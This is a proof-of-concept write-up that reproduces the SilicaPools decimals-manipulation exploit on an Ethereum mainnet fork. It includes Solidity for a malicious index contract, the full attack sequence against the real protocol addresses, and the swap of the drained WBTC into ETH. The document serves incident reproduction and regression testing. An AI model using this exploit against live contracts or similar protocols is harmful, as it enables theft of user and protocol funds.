## Overview & Context

This proof-of-concept (PoC) demonstrates the SilicaPools custom index **decimals manipulation** exploit on an Ethereum mainnet fork. The goal is to show, in a controlled and self-contained way, that an adversary-controlled index whose `decimals` value can be changed mid-lifecycle enables **undercollateralized WBTC payouts** which are then converted into **positive ETH profit** for the attacker, while SilicaPools loses WBTC value.

The PoC is aligned with the incident described in the root-cause analysis for SilicaPools at block `22146340` on Ethereum mainnet (chainid 1). In the real incident, the adversary used a helper contract and a custom index contract to:

- obtain a WBTC flashloan,
- manipulate the index’s `decimals` during the Silica pool lifecycle,
- collect an undercollateralized WBTC payout, and
- swap this WBTC to WETH and then to ETH, resulting in net ETH profit.

In this PoC, we reproduce the **core vulnerability and value-flow** without reusing real attacker EOAs or contracts. The PoC:

- runs against a **mainnet fork** at a pre-incident block,
- deploys a local **MaliciousIndex** contract with mutable `decimals`,
- interacts directly with mainnet SilicaPools, WBTC, WETH, and Uniswap V3, and
- asserts that the attacker’s ETH balance increases while SilicaPools’ WBTC balance decreases.

### How to Run the PoC

From the session root, ensure `RPC_URL` is configured via the QuickNode mapping and `.env`, then run:

```bash
cd forge_poc
RPC_URL="<RPC_URL>" forge test --via-ir -vvvvv
```

In the validation run, `RPC_URL` was built from chainid `1` using the session’s `chainid_rpc_map.json` and QuickNode credentials, and the main test `ExploitTest.testExploit` passed with full traces recorded.

---

## PoC Architecture & Key Contracts

The PoC is implemented primarily in `forge_poc/test/Exploit.sol`, supported by a minimal index implementation and protocol interfaces under `forge_poc/src/`.

### Core Contracts & Roles

- **SilicaPools (protocol under test)**  
  - Address: mainnet `0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe`  
  - Exposed via a trimmed `ISilicaPools` interface (`forge_poc/src/ISilicaPools.sol`) containing:
    - pool parameter and state structs,
    - order structs and hashing helpers,
    - `fillOrders`, `startPool`, `endPool`, `redeemLong`, and view functions.

- **WBTC and WETH (payout and bridge assets)**  
  - WBTC (payout token): mainnet `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`  
  - WETH: mainnet `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`

- **Uniswap V3 SwapRouter (for WBTC→WETH→ETH)**  
  - Router address: mainnet `0xE592427A0AEce92De3Edee1F18E0157C05861564`  
  - Interfaced via `ISwapRouter` and token interfaces in `forge_poc/src/UniswapV3RouterInterfaces.sol`.

- **MaliciousIndex (adversary-controlled index)**  
  - Source: `forge_poc/src/MaliciousIndex.sol`  
  - Implements `ISilicaIndex` with **mutable `decimals`, `shares`, and `balance`**:

```solidity
// Origin: forge_poc/src/MaliciousIndex.sol
contract MaliciousIndex is ISilicaIndex {
    address public owner;

    uint256 public override shares;
    uint256 public override balance;
    uint256 public override decimals;

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    constructor(address _owner, uint256 _shares, uint256 _balance, uint256 _decimals) {
        owner = _owner;
        shares = _shares;
        balance = _balance;
        decimals = _decimals;
    }

    function configure(uint256 _shares, uint256 _balance, uint256 _decimals) external onlyOwner {
        shares = _shares;
        balance = _balance;
        decimals = _decimals;
    }
}
```

*Snippet 1 — Malicious index model:* a minimal adversary-controlled index with owner-gated `configure` that can arbitrarily change `shares`, `balance`, and `decimals`. This models the mutable-decimals behavior of the real incident index without depending on on-chain attacker artifacts.

- **ExploitTest (Foundry test harness)**  
  - Source: `forge_poc/test/Exploit.sol`  
  - Inherits from `forge-std/Test` and wires together:
    - constants for mainnet protocol addresses and chain configuration,
    - the `MaliciousIndex` instance,
    - SilicaPools order construction and signing,
    - the core exploit sequence (`reproducerAttack`),
    - and the main test assertion (`testExploit`).

### Key Exploit Logic

The exploit logic lives in `ExploitTest`:

- `setUp()`:
  - forks mainnet and deploys `MaliciousIndex` with **high initial decimals** (`31`),
  - seeds WBTC/ETH balances to attacker and maker,
  - constructs and fills a Silica order so SilicaPools holds WBTC collateral backed by the malicious index.

- `reproducerAttack()`:
  - starts the pool,
  - **reconfigures** the malicious index mid-lifecycle to set `decimals = 1` and a large `balance`,
  - ends the pool and redeems long tokens,
  - swaps the resulting WBTC into WETH and then ETH.

- `testExploit()`:
  - enforces oracle pre-conditions (initial decimals high, SilicaPools has WBTC),
  - ensures `decimals` decreases during the exploit,
  - asserts that attacker’s ETH increases and SilicaPools’ WBTC decreases.

```solidity
// Origin: forge_poc/test/Exploit.sol (core test)
function testExploit() public {
    uint256 initialDecimals = ISilicaIndex(address(maliciousIndex)).decimals();
    assertGt(initialDecimals, 1, "malicious index must start with high decimals");

    uint256 victimWbtcBefore = wbtc.balanceOf(SILICA_POOLS_ADDR);
    assertGt(victimWbtcBefore, 0, "SilicaPools must have WBTC before exploit");

    uint256 attackerEthBefore = attacker.balance;
    uint256 decimalsBefore = ISilicaIndex(address(maliciousIndex)).decimals();

    reproducerAttack();

    uint256 decimalsAfter = ISilicaIndex(address(maliciousIndex)).decimals();
    assertGt(decimalsBefore, decimalsAfter, "index.decimals must decrease during exploit");

    uint256 attackerEthAfter = attacker.balance;
    assertGt(attackerEthAfter, attackerEthBefore, "attacker must end with more ETH");

    uint256 victimWbtcAfter = wbtc.balanceOf(SILICA_POOLS_ADDR);
    assertLt(victimWbtcAfter, victimWbtcBefore, "SilicaPools must lose WBTC to attacker");
}
```

*Snippet 2 — Main validation test:* enforces all pre-checks, hard constraints, and soft constraints specified in the oracle definition: high initial decimals, positive WBTC collateral, decimals decrease during the exploit, positive ETH profit for the attacker, and a decrease in SilicaPools’ WBTC balance.

---

## Adversary Execution Flow

This section describes the **end-to-end ACT sequence** as implemented in the Foundry test.

### 1. Funding & Environment Setup

The environment is prepared in `setUp()`:

- **Mainnet Fork**  
  - Reads `RPC_URL` from the environment and forks Ethereum mainnet at a pre-incident block:

```solidity
// Origin: forge_poc/test/Exploit.sol (setUp, fork)
string memory rpcUrl = vm.envString("RPC_URL");
uint256 forkId = vm.createSelectFork(rpcUrl, PRE_STATE_BLOCK);
vm.selectFork(forkId);
assertEq(block.chainid, MAINNET_CHAIN_ID);
```

*Snippet 3 — Mainnet fork:* the test uses `vm.createSelectFork` on Ethereum mainnet (chainid 1), at `PRE_STATE_BLOCK = 22146339`, just before the incident block in the root-cause report. No local mocks replace core protocol components.

- **Actor Identities**  
  - Attacker and maker are derived from local private keys / labels:
    - `attacker = vm.addr(attackerSk)` with `attackerSk = 0xA11CE`,
    - `maker = makeAddr("maker")`, later re-bound to `vm.addr(makerSk)` for signing.

- **Adversary Index Deployment**  
  - Deploys `MaliciousIndex` with high initial decimals:

```solidity
// Origin: forge_poc/test/Exploit.sol (setUp, index deployment)
uint256 initialShares = 1e18;
uint256 initialBalance = 0;
uint256 initialDecimals = 31;
maliciousIndex = new MaliciousIndex(attacker, initialShares, initialBalance, initialDecimals);
vm.label(address(maliciousIndex), "MaliciousIndex");
```

*Snippet 4 — Malicious index deployment:* the index starts with `decimals = 31`, matching the high-precision configuration observed in the incident. This ensures collateralization uses a high-precision scale.

- **Funding Balances & Approvals**
  - Uses Foundry’s `deal` helper to assign:
    - 100 WBTC (8 decimals) to the maker,
    - 2 WBTC to the attacker,
    - 1 ETH to the attacker for gas / slippage.
  - Grants `SilicaPools` and Uniswap router approvals from the appropriate actors.

### 2. Deployment & Collateralization via Silica Order

`setUp()` constructs and fills a Silica order where the maker funds WBTC collateral and the attacker receives the long ERC-1155 tokens:

```solidity
// Origin: forge_poc/test/Exploit.sol (setUp, order flow)
poolParams = ISilicaPools.PoolParams({
    floor: 0,
    cap: 1e8,
    index: address(maliciousIndex),
    targetStartTimestamp: startTs,
    targetEndTimestamp: endTs,
    payoutToken: WBTC_ADDR
});

order.maker = maker;
order.taker = attacker;
order.offeredLongSharesParams = poolParams;
order.offeredLongShares = 1e18; // 1 share.
// ...
uint256 makerSk = 0xBEEFBEEF;
maker = vm.addr(makerSk);
// re-fund maker and re-grant approval...

bytes32 domainSeparator = silicaPools.domainSeparatorV4();
bytes32 orderHash = silicaPools.hashOrder(order, domainSeparator);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(makerSk, orderHash);
bytes memory signature = abi.encodePacked(r, s, v);

ISilicaPools.SilicaOrder[] memory orders = new ISilicaPools.SilicaOrder[](1);
orders[0] = order;
bytes[] memory signatures = new bytes[](1);
signatures[0] = signature;
uint256[] memory fractions = new uint256[](1);
fractions[0] = 1e18; // fill 100% of the order.

vm.startPrank(attacker);
silicaPools.fillOrders(orders, signatures, fractions);
vm.stopPrank();

uint256 silicaWbtcAfterFill = wbtc.balanceOf(SILICA_POOLS_ADDR);
assertGt(silicaWbtcAfterFill, 0, "SilicaPools must have WBTC collateral after fill");
```

*Snippet 5 — Collateralization via fillOrders:* the PoC uses Silica’s real EIP-712 order flow and `fillOrders` to move WBTC from the maker into SilicaPools and mint ERC-1155 long/short positions. The assertion ensures SilicaPools actually holds WBTC collateral before the exploit.

This step corresponds to the **funding and position-minting** phase of the incident, where the adversary sets up positions that will later benefit from the mis-scaled pool math.

### 3. Exploit Steps

The actual exploit sequence is implemented in `reproducerAttack()`:

```solidity
// Origin: forge_poc/test/Exploit.sol (reproducerAttack)
function reproducerAttack() internal {
    vm.warp(poolParams.targetStartTimestamp + 1);

    vm.startPrank(attacker);
    silicaPools.startPool(poolParams);
    vm.stopPrank();

    vm.prank(attacker);
    maliciousIndex.configure(1e18, 1e26, 1);

    vm.warp(poolParams.targetEndTimestamp + 1);

    vm.expectCall(address(maliciousIndex), abi.encodeWithSignature("decimals()"));

    vm.startPrank(attacker);
    silicaPools.endPool(poolParams);

    bytes32 poolHash = silicaPools.hashPool(poolParams);
    ISilicaPools.PoolState memory sState = silicaPools.poolState(poolHash);
    uint256 longTokenId = silicaPools.toLongTokenId(poolHash);
    uint256 attackerLongBalance = IERC1155(SILICA_POOLS_ADDR).balanceOf(attacker, longTokenId);
    uint256 longPayoutView = silicaPools.viewRedeemLong(poolParams, attacker);
    console2.log("collateralMinted", sState.collateralMinted);
    console2.log("sharesMinted", sState.sharesMinted);
    console2.log("balanceChangePerShare", sState.balanceChangePerShare);
    console2.log("attackerLongBalance", attackerLongBalance);
    console2.log("viewRedeemLong(attacker)", longPayoutView);

    silicaPools.redeemLong(poolParams);
    vm.stopPrank();
    // ... swap WBTC -> WETH -> ETH ...
}
```

*Snippet 6 — Exploit sequence:* after the pool is started with high-decimals index configuration, the attacker reconfigures the index to have `decimals = 1` and a large `balance` mid-lifecycle, ensuring that `endPool` computes `balanceChangePerShare` using a different scale than the one implied at collateralization time.

Traces from the validation run confirm:

- `MaliciousIndex::decimals()` returns `31` before configuration,
- `MaliciousIndex::configure` updates internal storage so that `decimals` changes from `31` to `1`,
- during `SilicaPools::endPool`, SilicaPools performs:
  - `index.balance()` returning a large end balance,
  - `index.decimals()` returning `1`, satisfying the oracle that **decimals must change mid-lifecycle and be used at pool end**.

### 4. Profit Realization

After `endPool` and `redeemLong`, the attacker holds WBTC gained from the mis-scaled payout logic. The PoC then converts this to ETH:

```solidity
// Origin: forge_poc/test/Exploit.sol (reproducerAttack, swap and unwrap)
uint256 wbtcBalance = wbtc.balanceOf(attacker);
if (wbtcBalance > 0) {
    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn: WBTC_ADDR,
        tokenOut: WETH_ADDR,
        fee: 3000,
        recipient: attacker,
        deadline: block.timestamp + 1,
        amountIn: wbtcBalance,
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 0
    });
    router.exactInputSingle(params);
}

uint256 wethBalance = weth.balanceOf(attacker);
if (wethBalance > 0) {
    weth.withdraw(wethBalance);
}
```

*Snippet 7 — Profit realization:* the attacker swaps WBTC to WETH on the real mainnet WBTC/WETH pool via Uniswap V3, then unwraps WETH to ETH. The main test asserts that attacker ETH is strictly higher post-exploit, confirming a positive ETH-denominated profit.

Traces show that:

- the attacker receives WBTC from `redeemLong`,
- this WBTC is swapped into WETH in the mainnet WBTC/WETH Uniswap pool,
- WETH is withdrawn into ETH to the attacker’s EOA.

---

## Oracle Definitions and Checks

The validation oracles are defined in `artifacts/poc/oracle_generator/oracle_definition.json`. The PoC treats these as the specification for success and implements them explicitly.

### Variables

The oracle definition identifies key variables:

- `attacker`: an attacker EOA (address set dynamically in PoC using `vm.addr(attackerSk)`).
- `silica_pools`: SilicaPools protocol contract at `0xf3F8…9bDe`.
- `malicious_index`: custom index implementing `ISilicaIndex` with mutable `decimals`.
- `wbtc_token`: WBTC ERC-20 token.
- `weth_token`: WETH ERC-20 token.
- `profit_token_eth`: native ETH, used as the reference asset for profit.

The PoC maps these one-to-one onto:

- `attacker` and `maker` state variables in `ExploitTest`,
- `silicaPools`, `wbtc`, `weth`,
- `maliciousIndex`,
- and the native `attacker.balance` for ETH profit.

### Pre-checks

1. **Malicious index starts with high decimals**
   - Oracle:  
     - Description: initial `malicious_index.decimals()` must represent a high-precision scale.  
     - Assertion: `assertGt(initialDecimals, 1);`
   - PoC implementation:
     - After deployment, `initialDecimals` is fetched from `maliciousIndex.decimals()` in `testExploit`.
     - The test asserts `initialDecimals > 1`.

2. **SilicaPools holds positive WBTC collateral**
   - Oracle:  
     - Description: SilicaPools must have positive WBTC collateral prior to the exploit.  
     - Assertion: `assertGt(victimWbtcBefore, 0);`
   - PoC implementation:
     - After `fillOrders`, `silicaWbtcAfterFill` is asserted to be `> 0` in `setUp`.
     - `testExploit` re-reads `victimWbtcBefore` and asserts `> 0` before running `reproducerAttack`.

### Hard Constraints

1. **`decimals` must change mid-lifecycle**
   - Oracle:  
     - Condition: `decimals_after < decimals_before`.  
     - Intended behavior: record decimals before exploit, run exploit, record after, assert decrease.
   - PoC implementation:
     - `decimalsBefore = ISilicaIndex(address(maliciousIndex)).decimals();`
     - `reproducerAttack()` calls `maliciousIndex.configure(..., 1)` mid-lifecycle.
     - `decimalsAfter` is read post-exploit, and the test asserts `decimalsBefore > decimalsAfter`.
   - Evidence: traces show storage changing from `31` to `1` on the malicious index during the exploit.

2. **SilicaPools must call `index.decimals()` at pool end**
   - Oracle:  
     - Condition: at least one call to `malicious_index.decimals()` during pool end.  
     - Intended behavior: enforce `vm.expectCall` on `decimals()` and then run the exploit.
   - PoC implementation:
     - Before calling `SilicaPools.endPool`, `reproducerAttack()` sets:

       ```solidity
       vm.expectCall(address(maliciousIndex), abi.encodeWithSignature("decimals()"));
       ```

     - Then calls `silicaPools.endPool(poolParams);`.
   - Evidence: validation trace shows a `MaliciousIndex::decimals()` staticcall from within `SilicaPools::endPool`, satisfying the expectation.

3. **Profit asset is ETH**
   - Oracle:  
     - Condition: primary profit measured in native ETH, not an ERC-20.  
     - Intended behavior: use `attacker.balance` before and after exploit.
   - PoC implementation:
     - `attackerEthBefore = attacker.balance;` before `reproducerAttack()`.
     - `attackerEthAfter = attacker.balance;` after.
     - Test asserts `attackerEthAfter > attackerEthBefore`.

### Soft Constraints

1. **Attacker ETH profit positive**
   - Oracle:  
     - Condition: attacker ends with strictly more ETH than before (`> 0` delta).  
   - PoC implementation:
     - As above, ETH balances are compared in `testExploit`, and `assertGt` enforces strict positivity.
   - Evidence: traces show successful WBTC→WETH→ETH swap and withdrawal; the assertion passes.

2. **SilicaPools WBTC depletion**
   - Oracle:  
     - Condition: SilicaPools’ WBTC balance must decrease as a result of the exploit.  
   - PoC implementation:
     - `victimWbtcBefore = wbtc.balanceOf(SILICA_POOLS_ADDR);` before `reproducerAttack()`.
     - `victimWbtcAfter = wbtc.balanceOf(SILICA_POOLS_ADDR);` after.
     - The test asserts `victimWbtcAfter < victimWbtcBefore`.
   - Evidence: trace logs show WBTC moving out of SilicaPools and into attacker/control paths; the assertion passes.

Collectively, these checks ensure the PoC is not just executing some arbitrary profitable strategy, but specifically the **decimals-mutation exploit** described in the root-cause artifacts.

---

## Validation Result and Robustness

The automated PoC validator executed `forge test` and captured traces and logs in:

- `artifacts/poc/poc_validator/forge-test.log`

The validation result JSON, written to:

- `artifacts/poc/poc_validator/poc_validated_result.json`

encodes the following high-level outcome:

- `overall_status = "Pass"`  
  - The PoC’s main test `ExploitTest.testExploit` passes on the mainnet fork.
  - All validation oracles (pre-checks, hard constraints, soft constraints) are implemented and satisfied.
  - Quality criteria—oracle alignment, readability, absence of attacker artifacts, end-to-end ACT coverage, and root-cause alignment—are all marked as passing.

Key robustness points:

- **Oracle Alignment:** every oracle from `oracle_definition.json` is explicitly codified as an assertion or expectation in the test; there is no silent reliance on behavior.
- **Mainnet Fork & Real Integrations:** the PoC uses a mainnet fork with real contracts for SilicaPools, WBTC, WETH, and Uniswap V3; no core protocol component is mocked.
- **Self-Contained Adversary:** attacker addresses and the malicious index are freshly deployed/derived and do not reuse incident EOAs or helper contract addresses.
- **Value-Flow Verification:** ETH profit and WBTC depletion are both directly asserted, ensuring the exploit is not a no-op on the victim or a purely notional profit.

The PoC therefore provides a robust, repeatable reproduction of the exploit scenario suitable for regression testing and protocol-hardening work.

---

## Linking PoC Behavior to Root Cause

Finally, we connect the PoC’s behavior back to the root-cause framing for the SilicaPools incident.

### Exercising the Vulnerable Logic

The root-cause report identifies the following key elements:

- SilicaPools relies on an external `ISilicaIndex` for `shares`, `balance`, and `decimals`.
- `PoolMaths.balanceChangePerShare` is computed at pool end using **live `index.decimals()`**.
- The adversary-controlled index in the incident changes `decimals` from a high value (e.g., 31) to a low value (e.g., 1) mid-lifecycle.
- This mismatch between collateralization-time assumptions and end-of-pool scaling enables undercollateralized WBTC payouts.

The PoC directly targets this logic:

- Deploys a local `MaliciousIndex` with high initial decimals.
- Collateralizes a WBTC-denominated Silica pool that references this index.
- After collateral is locked and long/short tokens are minted, the attacker:
  - decreases `decimals` to 1,
  - increases `balance` to a large value, shaping a favorable `balanceChangePerShare`.
- When SilicaPools ends the pool, it:
  - reads the new large `balance`,
  - reads the new low `decimals`,
  - recomputes `balanceChangePerShare` based on these mutated values.

Traces confirm that `MaliciousIndex::decimals()` is called from `SilicaPools::endPool`, and storage diffs show `decimals` changing from `31` to `1` during the exploit, exactly mirroring the incident’s key invariant violation.

### Demonstrating Victim Loss and Adversary Profit

The ACT framing in the root-cause report defines the exploit predicate as **positive ETH profit** for the adversary, derived from undercollateralized WBTC payouts. The PoC encodes this as:

- **Victim Loss:**
  - Asserts SilicaPools holds WBTC collateral before the exploit.
  - Asserts SilicaPools’ WBTC balance decreases after the exploit.

- **Adversary Profit:**
  - Asserts attacker ETH balance increases after redeeming long tokens and swapping WBTC→WETH→ETH.

These checks map directly onto the incident narrative:

- WBTC value leaves SilicaPools due to mis-scaled accounting.
- The attacker converts this value into ETH and ends with strictly positive ETH profit.

### Mapping to ACT Roles and Steps

- **Adversary-crafted actions:**
  - Deploying and configuring the malicious index (`MaliciousIndex`).
  - Constructing and signing the Silica order (maker) and filling it (attacker).
  - Starting and ending the pool, reconfiguring index state mid-lifecycle.
  - Redeeming long tokens and performing the Uniswap swap and WETH withdrawal.

- **Victim-observed state:**
  - SilicaPools’ accounting of collateral and payouts (via `poolState` and `balanceChangePerShare`).
  - WBTC balances of SilicaPools and the attacker.
  - ETH balance of the attacker post-swap.

The PoC ties these together via explicit assertions and logs, confirming that the same **mutable-decimals root cause** identified in the root-cause analysis is sufficient, in isolation, to realize the exploit predicate on a mainnet fork.

---

## Summary

This PoC:

- Runs on an Ethereum mainnet fork with real SilicaPools, WBTC, WETH, and Uniswap V3 contracts.
- Introduces a locally deployed malicious index with mutable `decimals`.
- Shows that changing `decimals` mid-lifecycle and relying on SilicaPools’ use of live `index.decimals()` at pool end leads to mis-scaled payouts.
- Demonstrates both **WBTC loss for SilicaPools** and **positive ETH profit for the attacker**, satisfying all validation oracles.
- Avoids using real attacker EOAs or contracts from the incident, keeping the reproduction self-contained and suitable for regression testing.

The PoC is therefore a high-quality, oracle-aligned reproduction of the SilicaPools custom index decimals manipulation exploit.

